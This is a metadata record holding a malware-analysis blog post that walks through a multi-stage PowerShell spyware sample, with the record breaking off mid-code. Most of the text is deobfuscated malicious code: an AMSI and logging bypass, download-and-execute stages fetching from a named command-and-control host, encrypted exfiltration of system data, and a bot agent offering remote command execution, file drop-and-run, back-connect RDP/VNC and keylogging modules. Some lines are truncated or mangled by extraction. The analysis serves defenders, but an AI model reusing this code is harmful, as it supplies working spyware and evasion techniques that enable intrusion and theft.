{
    "id": "eaa201b7-8343-4053-95a0-62ec6594e3c9",
    "created_at": "2023-01-12T14:59:41.092103Z",
    "updated_at": "2025-03-27T02:05:23.92201Z",
    "deleted_at": null,
    "sha1_hash": "8b3cbf29afb263d8f3c8947002546f3fddb81863",
    "title": "2018-03-28 - Multi-stage Powershell script (Brownies)",
    "authors": "",
    "file_creation_date": "2022-05-28T15:36:19Z",
    "file_modification_date": "2022-05-28T15:36:19Z",
    "file_size": 2711176,
    "plain_text": "# Multi-stage Powershell script (Brownies)\n\n**[dissectmalware.wordpress.com/2018/03/28/multi-stage-powershell-script/](https://dissectmalware.wordpress.com/2018/03/28/multi-stage-powershell-script/)**\n\nMarch 28, 2018\n\n### While examining different PowerShell scripts on the Hybrid-Analysis website, I found a very complex PowerShell script that downloads its code in many stages. In the fifth stage, the PowerShell code contains two executable code in base64 encoding for x86 32 and 64 bits architecture. In the last stage, the Powershell code acts as spyware and takes screenshots from windows that contain certain words in their titles such as PayPal, Walmart.\n\n## First stage\n\n### PowerShell script: https://www.hybrid- analysis.com/sample/485515cc769bd0e2ab62e5697e743196dc6ecebd44319b1adf9e8b935 a059bc3?environmentId=100\n\n Fig 1: the PowerShell script in first stage The string in Fig 1 is first decoded with a base64 decoder and then is decompressed. We get the following code after these operations:\n\n Fig 2: using string substitution technique for obfuscating the code In the above code, we have a format string (starts by {9}{8}{12}…) followed by a series of strings. After placing strings in the correct position, we get:\n\n\n-----\n\n### Fig 3: deobfuscate code Let’s take a look at the code for a moment. The following code is the formatted version of the above code:\n```\n# disables security feater in PowerShell v3 and above\n$(If($PSVersionTable.PSVersion.Major -ge 3)\n{\n  $GPF=\n[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPoli\n  If($GPF){\n    $GPC=$GPF.GetValue($null);\n    If($GPC['ScriptBlockLogging']){\n      $GPC['ScriptBlockLogging']['EnableScriptBlockLogging']=0;\n      $GPC['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0\n    }\n    $val=\n[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add('EnableScriptBl\n    $val.Add('EnableScriptBlockInvocationLogging',0);\n$GPC['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLog\n  }\n  Else{\n    [ScriptBlock].\"GetFie`ld\"('signatures','NonPublic,Static').SetValue($null,\n(New-Object Collections.Generic.HashSet[string]))\n  }\n  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|?{$_}|%\n{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)};\n};\n[System.Net.ServicePointManager]::Expect100Continue=0;;\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};\nsleep -s 4;\n# generates a random url with a specific pattern\n$sr=.(Get-Command\nnE`*cT)systE`m.iO`.STrEA`MrE`ADEr([Net.HttpWebRequest]::Create('https://winmetricanali\n $(-join(\"adefenoprsatuviwyz\".ToCharArray()|Get-Random -Count $(@('8','6','7')|GetRandom)))+'.'+ $(@('php','jsp','asp')|GetRandom)).GetResponse().GetResponseStream());\nsleep -s 3;\n$res=$sr.ReadToEnd();\nsleep -s 2;\n$sr.Close());\n# executes the downloaded PowerShell\n.(Get-Alias i`*X)($res)\n\n```\n\n-----\n\n### From line 3 to 20, the code attempts to disable PowerShell logging and Microsoft ASMI. From line 21 to 26, the malicious script downloads its second stage PowerShell script. In the end, it executes the downloaded script.\n\n## Second Stage\n\n### Fig 4 shows the second stage of this malware. $eB89 is first reversed and then decompressed.\n\n fig 4: the PowerShell script in second stage Fig 5 and 6 show the $eB89 content after performing these operations.\n\n Fig 5: after reversing\n\n Fig 6: after replacing and decompressing Let’s take a look at this code. I formatted the code so that we can read it better:\n\n\n-----\n\n```\n$url https://winmetricanalise.tech/ + $(\njoin(\"adefenoprsatuviwyz\".ToCharArray()|Get-Random -Count $(@(10,16,14)|GetRandom)))+'.'+ $(@('php','jsp','asp')|Get-Random);\n$K='L(oNXStkDP;l0YTs7[HJBOvrK3M,=chm';\n$I=0;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};\n[SysTEm.Net.SeRvICePoIntMAnaGEr]::Expect100ConTINuE=0;\n$buffer = [System.Text.Encoding]::UTF8.GetBytes('url');\n[System.Net.HttpWebRequest] $webRequest = [System.Net.WebRequest]::Create($url);\n$webRequest.Timeout = 10000;$webRequest.Method = 'POST';\n$webRequest.UserAgent = 'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36\n(KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36 Edge/12.0';\n$webRequest.ContentType = 'application/x-www-form-urlencoded';\n$webRequest.ContentLength = $buffer.Length;;\n$requestStream = $webRequest.GetRequestStream();\n$requestStream.Write($buffer, 0, $buffer.Length);\n$requestStream.Flush();$requestStream.Close();\n[System.Net.HttpWebResponse] $webResponse = $webRequest.GetResponse();\n$streamReader = New-Object System.IO.StreamReader($webResponse.GetResponseStream());\n[CHAr[]]$result = ([cHAr[]]($streamReader.ReadToEnd()))|%{$_-BXor$K[$I++%$k.LeNGtH]};\n.(Get-Alias i`*X)($result-JOIn'')\n\n### Basically, in this stage, the malware download and execute its third stage.\n\n## Third Stage\n\n### Below is the code that is downloaded for the third stage:\n\n Fig 7: PowerShell script for the third stage After decompressing the code, we have\n\n```\n\n-----\n\n```\nfunction GsdsetWweter {\n  $Serv = $args[0]\n  $SK = $args[1]\n  $USAG = $args[2]\n  $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Security\");\n  $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Core\");\n  $ErrorActionPreference = \"SilentlyContinue\";\n  $e=[System.Text.Encoding]::ASCII;\n  function Get-SysID($HashName = \"MD5\"){\n    [string]$ret = \"\"\n$hd = gwmi win32_bios\n    $ret = $hd[\"SerialNumber\"].ToString()\n    [string]$String = $([Environment]::UserName +\n[Environment]::MachineName + $ret).ToLower();\n    $StringBuilder = New-Object System.Text.StringBuilder\n    [System.Security.Cryptography.HashAlgorithm]::Create($HashName).ComputeHash([S\n{\n      [Void]$StringBuilder.Append($_.ToString(\"x2\"))\n      }\n      $e = $StringBuilder.ToString().ToLower()\n      $e\n    }\n Function HasGet-Bretring($ht) {\n $first = $true\n foreach($pair in $ht.GetEnumerator()) {\n  if ($first)\n  {\n    $first = $false\n  }\n  else\n  {\n    $output += ';'\n  }\n  $output+=\"{0}\" -f $($pair.Value)\n  }\n  $output\n }\n function Get-workconfig {\n Get-WmiObject Win32_NetworkAdapter -Filter 'NetConnectionStatus=2' |\n  ForEach-Object {\n   $result = 1 | Select-Object Name, IP, MAC, ID\n   $result.Name = $_.Name\n   $result.MAC = $_.MacAddress\n   $result.ID = $_.DeviceID\n   $config = $_.GetRelated('Win32_NetworkAdapterConfiguration')\n   $result.IP = $config | Select-Object -expand IPAddress\n   $result\n  }\n}\n  function Get-Sysinfo {\n    $str = [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+\n[Environment]::MachineName;\n\n```\n\n-----\n\n```\n    $string \n    foreach($c in Get-workconfig){\n      [string]$lanname = $c.Name; [string]$macadr = $c.MAC; [string]$ID = $c.ID\n      $ip = @{$true=$c.IP[0];$false=$p.IP}[$c.IP.Length -lt 6];\n      [string]$ip = $c.IP[0]; if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};\n      $lanconf = @{\n      id = $ID\n      ip = $ip;\n      mac = $macadr;\n      name = $lanname;\n      }\n      $string += HasGet-Bretring $lanconf\n    }\n    $o = (Get-WmiObject Win32_OperatingSystem)\n    $str += \"|$string\";\n    $str += '|' +$o.Name.split('|')[0];\n    if(([Environment]::UserName).ToLower() -eq \"system\"){\n      $str += '|True'\n    }\n    else{\n      $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.Wi\n    }\n    [void] [Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\n    $Screens = [system.windows.forms.screen]::AllScreens\n    foreach ($Screen in $Screens) {\n      $Width = $Screen.Bounds.Width\n      $Height = $Screen.Bounds.Height\n    }\n    $str += '|' + \"$Width`x$Height\"\n    $n = [System.Diagnostics.Process]::GetCurrentProcess()\n    $str += '|'+$n.ProcessName+'|'+$n.Id\n    $str += '|' + $PSVersionTable.PSVersion.Major\n    $str += '|' + $ENV:PROCESSOR_ARCHITECTURE\n    $str += '|' + (gwmi win32_timeZone -ComputerName $env:ComputerName).caption\n    $str += '|' + $o.ConvertToDateTime($o.LastBootUpTime)\n    $str\n  }\nfunction getlisturi{\n  $RandName = -join(\"abcdefghijklmoprstvuxyz\".ToCharArray()|Get-Random Count $args[0]);$ar = @('php','jsp','asp') | Get-Random;\n  $RandName + '.' + $ar\n  }\n  function Get-Soft {\n  param (\n    [Parameter(ValueFromPipeline=$true)]\n    [string[]]$ComputerName = $env:COMPUTERNAME,\n    [string]$NameRegex = '(Opera|Firefox|Chrome|TAX|Lacerte|OLT|ProSeries|Ultratax\n  )\n  foreach ($comp in $ComputerName) {\n    $keys = '','\\Wow6432Node'\n\n```\n\n-----\n\n```\n    foreach ($key in $keys) {\n      try {\n        $apps = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine\n      } catch {\n        continue\n      }\n      foreach ($app in $apps) {\n        $program = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMach\n        $name = $program.GetValue('DisplayName')\n        $str = ''\n        if ($name -and $name -match $NameRegex) {\n          $str += $name + ';'\n          $str\n        }\n      }\n    }\n  }\n}\n      try {\n        $FirstAES=NewObject System.Security.Cryptography.AesCryptoServiceProvider;     }\n      catch {\n        $FirstAES=New-Object System.Security.Cryptography.RijndaelManaged;\n      }\n  $FirstIV = [byte] 0..255 | Get-Random -count 16;$FirstAES.Mode=\"CBC\";\n  $FirstAES.Key=$e.GetBytes($SK);\n  $FirstAES.IV = $FirstIV;\n  $csp = New-Object System.Security.Cryptography.CspParameters;\n  $csp.Flags = $csp.Flags bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;\n  $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider ArgumentList 2048,$csp;\n  $rk=$rs.ToXmlString($False);$ib=$e.getbytes($rk);\n  $eb=$FirstIV+$FirstAES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);\n  $BotIDXor= Get-SysID;\n  $EncodedText =[Convert]::ToBase64String($e.getbytes($BotIDXor));\n  $EncodedText2 =[Convert]::ToBase64String($e.getbytes($EncodedText));\n if(-not $wc){\n    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $tru\n    $wc=new-object system.net.WebClient;\n    $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();\n    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;\n  }\n  $wc.Headers.Add(\"User-Agent\",$USAG);\n  $wc.Headers.Add(\"Cookie\",\"SESSIONID:$EncodedText2\");\n  $raw=$wc.UploadData($Serv + \"/\" + $(getlisturi $(@(9,17,12)|GetRandom)),\"POST\",$eb);\n  $de=$e.GetString($rs.decrypt($raw,$false));\n  $key=$de[0..($de.length-2)] -join '';\n  $k=$de[$de.length-1] -join '';\n if ($k -eq 0) {\n  $str1 = Get-Sysinfo;\n\n```\n\n-----\n\n```\n  $str2  Get Soft;\n  $str = $str1 + '|' + $str2\n  }\n else{$str = 'OK'+ '|' + ([Security.Principal.WindowsPrincipal] [Security.Principal.W\n  $SecondAES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;\n  $SecondIV = [byte] 0..255 | Get-Random -count 16;\n  $SecondAES.Mode=\"CBC\"; $SecondAES.Key=$e.GetBytes($key); $SecondAES.IV = $SecondIV\n  $ib2=$e.getbytes($str);\n  $eb2=$SecondIV+$SecondAES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length\n  $wc.Headers.Add(\"User-Agent\",$USAG);\n  $raw=$wc.UploadData($Serv+ \"/\" + $(getlisturi $(@(18,19,4)|GetRandom)),\"POST\",$eb2);\ntry {$AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;}\ncatch {$AES=New-Object System.Security.Cryptography.RijndaelManaged;}\n  $AES.Mode=\"CBC\";\n  $IV = $raw[0..15];$AES.Key=$e.GetBytes($key);$AES.IV = $IV;\n  $shelles = [System.Text.Encoding]::ASCII.GetString($($AES.CreateDecryptor().Transf\n16)))\n  iex $shelles\n  $FirstAES=$null;$BotIDXor=$null;$rs=$null;$eb2=$null;$raw=$null;$IV=$null;$str=$nu\n  $Error.Clear()\n  [GC]::Collect()\n  [GC]::WaitForPendingFinalizers()\n  federerfegegfeg $key \"SESSIONID:$EncodedText2\" $Serv $USAG $([Security.Principal.W\n  }\n GsdsetWweter 'https://winmetricanalise.tech' 'L(oNXStkDP;l0YTs7[HJBOvrK3M,=chm' 'Moz\n <span id=\"mce_SELREST_start\" style=\"overflow:hidden;line-height:0;\"></span>\n\n### From line 151 to 155, the computer and user info of the system is retrieved, then this data is encrypted and sent to the C&C server on line 163.\n\n The C&C sends the stage 4 in the response body. The content is decrypted on line 168 and then will be executed on line 169. The code in the forth stage is actually a function with the name of federerfegegfeg. This function is called on line 174.\n\n## Stage four\n\n### The following code is returned on line 168.\n\n```\n\n-----\n\n### The same substitution technique is used. After placing the string on the correct position we get:\n\n After decompressing the code we get the PowerShell script for the forth stage:\n\n\n-----\n\n```\nfunction federerfegegfeg {\n $mtx = New-Object System.Threading.Mutex($false, \"GetIdDefender\")\n if ($mtx.WaitOne(1000)) {\n  $ErrorActionPreference = 'silentlycontinue';\n  $script:EncScriptkeylo = '';\n  $script:sendfile = '';\n  $agent = @{\n   seskey = $args[0];\n   Cookie = $args[1];\n   base = $args[2];\n   usag = $args[3];\n   priv = $args[4];\n   poshver = $args[5];\n   mischec = 0;\n   klcount = 0;\n   crptcount = 0;\n   klver = 'ssha';\n   fgver = 'exe';\n   wver = 'watcher';\n   fgrab = $true;\n   watcher = $false;\n   paths = $(Join-Path -Path $env:temp 'S-1-5-21-412654016-3479515840-311');\n   module = $true;\n   INTERVAL = 420;\n   encodingascii = [System.Text.Encoding]::ASCII;\n   encodingutf = [System.Text.Encoding]::UTF8;\n   job = @{};\n  }\n  if(!(Test-path $agent['paths'])) {\n   $h = ni -Path $agent['paths'] -ItemType \"directory\"\n   $h.attributes=\"Hidden\"\n    }\n  function Encrypt-Bytes {\n    param($bytes)\n    try{\n    $IV = [byte] 0..255 | Get-Random -count 16\n    $hmac = New-Object System.Security.Cryptography.HMACSHA1;\n    try {\n     $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider; }\n    catch {\n      $AES=New-Object System.Security.Cryptography.RijndaelManaged;\n     }\n    $AES.Mode = \"CBC\";\n    $AES.Key = $agent['encodingascii'].GetBytes($agent['seskey']);\n    $AES.IV = $IV;\n    $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $b\n    $hmac.Key = $agent['encodingascii'].GetBytes($agent['seskey']);\n    $ciphertext + $hmac.ComputeHash($ciphertext);\n       }\n    catch {$_.Exception.Message}\n    finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n  function Decrypt-Bytes {\n    param ($inBytes)\n\n```\n\n-----\n\n```\n    if($inBytes.Length gt 32){\n      $hmac = New-Object System.Security.Cryptography.HMACSHA1;\n      $mac = $inBytes[-20..-1];\n      $inBytes = $inBytes[0..($inBytes.length - 21)];\n      $hmac.Key = $agent['encodingascii'].GetBytes($agent['seskey']);\n      $expected = $hmac.ComputeHash($inBytes);\n      if (@(diff $mac $expected -sync 0).Length -ne 0){\n        return;\n      }\n      $IV = $inBytes[0..15];\n      try {\n        $AES=NewObject System.Security.Cryptography.AesCryptoServiceProvider; }\n      catch {\n        $AES=New-Object System.Security.Cryptography.RijndaelManaged;\n      }\n      $AES.Mode = \"CBC\";\n      $AES.Key = $agent['encodingascii'].GetBytes($agent['seskey']);\n      $AES.IV = $IV;\n      ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length\n16)\n    }\n  }\n  function Encode-Packet {\n   param([int]$type, $data)\n    try{\n    $data = [System.Convert]::ToBase64String($agent['encodingutf'].getbytes($data)\n    $packet = New-Object Byte[] (8 + $data.Length)\n    ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)\n    ([bitconverter]::GetBytes($data.Length)).CopyTo($packet, 4)\n    ($agent['encodingutf'].getbytes($data)).CopyTo($packet, 8)\n    $packet\n       }\n    catch {$_.Exception.Message}\n    finally{$data = $null; [GC]::Collect();[GC]::WaitForPendingFinalizers();}\n  }\n  function Decode-Packet {\n    param($packet, $offset=0)\n    $type = [bitconverter]::ToUInt32($packet, 0+$offset)\n    $length = [bitconverter]::ToUInt32($packet, 4+$offset)\n    $data = $agent['encodingutf'].GetString($packet[(8+$offset)..\n(8+$length+$offset-1)])\n    $packet = $null\n    @($type,$length,$data)\n  }\n  function Process-Packet {\n    param($type, $msg)\n    $outtype = '111'\n    try {\n     if($type -eq 1) {\n        $msg = \"[!] Agent logoff\"\n        SMailstream-sendpost -Packets $(Encode-Packet -type $outtype data $msg )\n        iex logoff\n\n```\n\n-----\n\n```\n      }\n      elseif($type -eq 2) {\n        $msg = \"[!] Agent Kill\"\n        Start-AgentJob $data 'DefenderKill'\n        SMailstream-sendpost -Packets $(Encode-Packet -type $outtype data $msg )\n        exit\n      }\n      elseif($type -eq 3) {\n        $msg = \"[!] Agent Update\"\n        $id = nproc 'powershell.exe' $data\n        SMailstream-sendpost -Packets $(Encode-Packet -type $outtype data $(\"New proc id $id\"))\n        exit\n      }\n      elseif($type -eq 40){\n        $cmd = $data[7..$data.Length] -join ''\n        if($cmd.Length -gt 0){\n          Encode-Packet -type $outtype -data $((IEX $cmd) join \"`n\").trim()\n        }\n      }\n      elseif($type -eq 42) {\n       $parts = $data.split('|')\n       $filename = $parts[0]\n       $base64part = $parts[1]\n       $file = $(Join-Path -Path $agent['paths'] $filename)\n       $Content = [System.Convert]::FromBase64String($base64part)\n        try{\n          Set-Content -Path $file -Value $Content -Encoding Byte\n          TRunpil $(\"cmd.exe /c start %COMSPEC% /C $file\")\n          $data = $null;$parts = $null;$filename = $null;$base64part = $null\n          Encode-Packet -type $outtype -data \"\n[*] Upload and start successful\"\n        }\n        catch {\n          Encode-Packet -type $outtype -data \"\n[!] Error in writing $filename during upload and start\"\n        }\n      }\n      elseif($type -eq 23){\n       Encode-Packet -type $outtype -data $((IEX $data) -join \"`n\").trim()\n      }\n      elseif($type -eq 19){\n       try {\n       $outout = \"\"\n       if (!($agent['job']['DefenderUpdateSecRDD'])){\n          Start-AgentJob $data 'DefenderUpdateSecRDD'\n          Encode-Packet -type $outtype -data $(\"Start Back connect RDP\")\n        }\n        else {\n        $outout = Stop-AgentJob 'DefenderUpdateSecRDD'\n        Stop-Process -Name rdpcliep | Out-Null\n\n```\n\n-----\n\n```\n        Start AgentJob $data DefenderUpdateSecRDD \n        Encode-Packet -type $outtype data $(\"reStart Back connect RDP stdout RDP >>> $($outout | Out-String) \")\n        }\n       }\n       catch {\n       $_.Exception.Message\n       }\n      }\n     elseif($type -eq 14){\n       try {\n       $outout = \"\"\n       if (!($agent['job']['DefenderUpdateSecID'])){StartAgentJob $data 'DefenderUpdateSecID'; Encode-Packet -type $outtype data \"Start Back connect VNC\" }\n       else { $outout = Stop-AgentJob 'DefenderUpdateSecID'; StartAgentJob $data 'DefenderUpdateSecID'; Encode-Packet -type $outtype data $(\"reStart Back connect VNC >>  $($outout | Out-String)\") }\n       }\n       catch {\n       $_.Exception.Message\n       }\n      }\n      elseif($type -eq 117){\n       try {\n       $outout = \"\"\n        if (!($agent['job']['DefenderipperSecID'])){StartAgentJob $data 'DefenderipperSecID';Encode-Packet -type $outtype data $(\"Start Back connect ripper\") }\n       else { $outout = Stop-AgentJob 'DefenderipperSecID';\n        Encode-Packet -type $outtype data $(\"Start Back connect ripper >>  $($outout | Out-String)\")\n        Start-AgentJob $data 'DefenderipperSecID'}\n       }\n       catch {\n       $_.Exception.Message\n       }\n      }\n     elseif($type -eq 114){\n       try {\n       $cmd = $data[9..$data.Length] -join ''\n       $outout = Stop-AgentJob $cmd\n       Encode-Packet -type $outtype -data $(\"Stop Job: $($outout | OutString)\")\n       }\n       catch {\n       $_.Exception.Message\n       }\n      }\n     elseif($type -eq 115){\n       try {\n       $cmd = $data[8..$data.Length] -join ''\n       if($cmd -eq 'on'){$agent['module'] = $true}\n       elseif($cmd -eq 'off'){$agent['module'] = $false}\n       Encode-Packet -type $outtype \n```\n\n-----\n\n```\ndata $( Module status: $($agent[ module ]| Out String) )\n        }\n       catch {\n       $_.Exception.Message\n       }\n      }\n    else {\n       $jobd = $true\n       $RandName = -join(\"ABCDEFGHKLMNPRSTUVWXYZ123456789\".ToCharArray()|GetRandom -Count 6)\n       Start-AgentJob $data $RandName\n       while($jobd){\n        if (Get-AgentJobCompleted $RandName){\n         $outout = Stop-AgentJob $RandName;\n         Encode-Packet -type $outtype data $(\"Output $type >>  $($outout | Out-String)\")\n         $jobd = $false;\n        }\n        sleep -s 4\n        }\n       }\n    }\n    catch{\n      $_.Exception.Message\n      Encode-Packet -type $outtype -data \"error running command: $_\"\n    }\n    finally{\n      [GC]::Collect()\n      [GC]::WaitForPendingFinalizers()\n      [GC]::Collect()\n     }\n    }\n  function ProcTasking {\n    param($tasking)\n    try{\n    $taskingBytes = Decrypt-Bytes $tasking\n    if (!$taskingBytes){\n      $agent['crptcount'] += 1\n      return \"\"\n    }\n    $decoded = Decode-Packet $taskingBytes\n    $type = $decoded[0]\n    $length = $decoded[1]\n    $data = $decoded[2]\n    $resultPackets = $(Process-Packet $type $data)\n    SMailstream-sendpost $resultPackets\n   }\n   catch {$_.Exception.Message }\n   finally{\n     [GC]::Collect()\n     [GC]::WaitForPendingFinalizers()\n    }\n  }\n  function getlisturi{\n  '/' + $(-join(\"abcdefghijklmoprstvuxyz\".ToCharArray()|Get-Random -Count $(Get\n```\n\n-----\n\n```\nRandom (5..10)))) + / + $( join( abcdefghijklmoprstvuxyz .ToCharArray()|Get\nRandom -Count $(Get-Random (7..12)));$ar = @('php','jsp','asp') | GetRandom) + '.' + $ar\n  }\n  function SMailstream-sendpost {\n    param($packets)\n    if($packets) {\n      $encBytes = Encrypt-Bytes $packets\n      if ($agent['base'].StartsWith(\"https\")){\n        [System.Net.ServicePointManager]::ServerCertificateValidationCallback=\n{$true};\n       }\n        [System.Net.ServicePointManager]::DefaultConnectionLimit = 1024\n        $wc = new-object system.net.WebClient;\n        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();\n        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentia\n        $wc.Headers.Add(\"User-Agent\",$agent['usag'])\n        $wc.Headers.Add(\"Cookie\",$agent['Cookie'])\n        try{\n          $response = $wc.UploadData($agent['base']+$(getlisturi),\"POST\",$en\n          $response\n        }\n    catch {sleep s 1; $response = $wc.UploadData($agent['base']+$(getlisturi),\"POST\",$encBytes); $respo\n    finally{\n     $wc.Dispose()\n     [GC]::Collect()\n     [GC]::WaitForPendingFinalizers()\n    }\n      }\n    }\n  function Get-Cmd {\n    try{\n      if ($agent['base'].StartsWith(\"https\")){\n        [System.Net.ServicePointManager]::ServerCertificateValidationCallback=\n{$true};\n       }\n        $wc = new-object system.net.WebClient;\n        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();\n        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentia\n        $wc.Headers.Add(\"User-Agent\",$agent['usag'])\n        $wc.Headers.Add(\"Cookie\",$agent['Cookie'])\n        $result = $wc.DownloadData($agent['base'] + $(getlisturi))\n        return $result\n      }\n    catch [System.Net.WebException],[System.IO.IOException] {\n     $_.Exception.Message\n     $agent['mischec'] += 1\n    }\n      finally{\n      $wc.Dispose();\n\n```\n\n-----\n\n```\n      [GC]::Collect()\n      [GC]::WaitForPendingFinalizers()\n      }\n  }\n    function TRunpil {\n    $runspace = [runspacefactory]::CreateRunspace()\n    $runspace.ApartmentState = \"STA\"\n    $runspace.ThreadOptions = \"ReuseThread\"\n    $runspace.Open()\n    $powershell = [powershell]::Create()\n    $powershell.Runspace = $runspace\n    [void]$powershell.AddScript($args[0])\n    [void]$powershell.BeginInvoke()\n  }\n  function Start-AgentJob {\nparam($ScriptString, $RandName)\nif($ScriptString -eq 'space'){return}\n$AppDomain = [AppDomain]::CreateDomain($RandName)\n$PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Aut\n$null = $PSHost.AddScript($ScriptString)\n$Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'\n$PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObjec\n$BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]))\n$Job = $BeginInvoke.Invoke($PSHost, @(($Buffer as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)))\n$agent['job']\n[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Jo\n}\n  function Get-AgentJobCompleted {\nif($agent['job'].ContainsKey($args[0])) {\n$agent['job'][$args[0]]['Job'].IsCompleted\n}}\n  function Stop-AgentJob {\nif($agent['job'].ContainsKey($args[0])) {\n$buffer = $agent['job'][$args[0]]['Buffer'].ReadAll()\n$errorkeylo = $agent['job'][$args[0]]['PSHost'].Streams.Error\n$Null = $agent['job'][$args[0]]['PSHost'].Stop()\n$Null = [AppDomain]::Unload($agent['job'][$args[0]]['AppDomain'])\n$agent['job'].Remove($args[0])\n    }\n  if(!($buffer)){$buffer = 'NotBufferTread'}\n  if(!($errorkeylo)){$errorkeylo = 'NotErrorTread'}\n  @($buffer, $errorkeylo)\n  }\n  function nproc{\n    $psi = New-Object System.Diagnostics.ProcessStartInfo;\n    $proc=new-object System.Diagnostics.Process;\n    $psi.CreateNoWindow = $true;\n    $psi.WindowStyle = 'Hidden';\n    $proc.StartInfo = $psi;\n    if($args[2]){$proc.StartInfo.UseShellExecute = $false}\n\n```\n\n-----\n\n```\n    $proc.StartInfo.FileName $args[0];\n    $proc.StartInfo.Arguments = '-noexit '  + '-nologo '+'-noprofile '+'NonInteractive '+ '-Command ' + $args[1];\n    $proc.start() | Out-Null\n    $proc.Id\n}\n  function get-moduledef{\n  try {\n   $r = 0\n  while($agent['module']){\n   $jobd = $true\n   $module = $(Decode-Packet(Decrypt-Bytes $(SMailstream-sendpost -packet $(EncodePacket -type 4 -data 'status'))))\n   if($module[0] -eq 99){$jobd = $false}\n   $RandName = -join(\"ABCDEFGHKLMNPRSTUVWXYZ123456789\".ToCharArray()|Get-Random Count 6)\n   Start-AgentJob $module[2] $RandName\n   while($jobd){\n    if (Get-AgentJobCompleted $RandName)\n    {\n     $outout = Stop-AgentJob $RandName;\n     if($module[0] -eq 66 -or $r -eq 22){$agent['module'] = $false}\n     debugingerror $outout $module[0];\n     $jobd = $false;\n    }\n    sleep -s 3\n   }\n   sleep -s 5\n  ++$r\n   }\n   }\n catch {$_.Exception.Message}\n  finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n    function get-fgrablogs {\n    try {\n     $datas = $($agent['encodingutf'].GetString($(Decrypt-Bytes $(SMailstreamsendpost -packet $(Encode-Packet -type $args[0] -data $args[1]))))) + \"`n\" + 'getfgruvers' + \" -versid atinmem \" + \" -fpath \" +\"'\" +$agent['paths']+ \"'\" + \" idsid 1215 -rckey\"+ \" '\"+$agent['seskey']+\"'\"\n     Start-AgentJob $datas $args[2]\n     $datas = $null\n    }\n    catch {$_.Exception.Message;}\n    finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n    function get-watcher {\n    try {\n     $datas = $($agent['encodingutf'].GetString($(Decrypt-Bytes $(SMailstreamsendpost -packet $(Encode-Packet -type $args[0] -data $args[1]))))) + \"`n\" + 'getwatcher' + \" '\"+$agent['seskey']+ \"'\" + \" '\"+$agent['paths'] +\"'\" + \" '\"+$agent['poshv\n     Start-AgentJob $datas $args[2]\n     $datas = $null\n    }\n\n```\n\n-----\n\n```\n    catch {$_.Exception.Message;}\n    finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n  function get-contentlogs {\n    try {\n     if ($agent['klver'] -eq 'ps') {$script:EncScriptkeylo = ''}\n     if(!($script:EncScriptkeylo)){\n     $datas = $($agent['encodingutf'].GetString($(Decrypt-Bytes $(SMailstreamsendpost -packet $(Encode-Packet -type $args[0] data $args[1]))))) + \"`n\" + 'def' + \" '\"+$agent['seskey']+ \"'\" + \" '\"+$agent['paths']\n     $script:EncScriptkeylo = EncryptBytes $agent['encodingascii'].GetBytes($datas);\n     }\n     else{$datas = $agent['encodingutf'].GetString($(DecryptBytes $script:EncScriptkeylo))}\n     Start-AgentJob $datas $args[2]\n     $datas = $null\n    }\n    catch {$_.Exception.Message;}\n    finally{[GC]::Collect();[GC]::WaitForPendingFinalizers()}\n  }\n  function Post-file{\n     try {\n     if(!($script:sendfile)){\n     $datas = $($agent['encodingutf'].GetString($(Decrypt-Bytes $(SMailstreamsendpost -packet $(Encode-Packet -type $args[0] data $args[1]))))) + \"`n\" + 'berrered' + \" '\"+$agent['seskey']+ \"'\" + \" '\"+$agent['Coo\n     $script:sendfile = Encrypt-Bytes $agent['encodingascii'].GetBytes($datas);\n     }\n     else{$datas = $agent['encodingutf'].GetString($(DecryptBytes $script:sendfile))}\n     Start-AgentJob $datas $args[2]\n     $datas = $null\n    }\n    catch {$_.Exception.Message;}\n    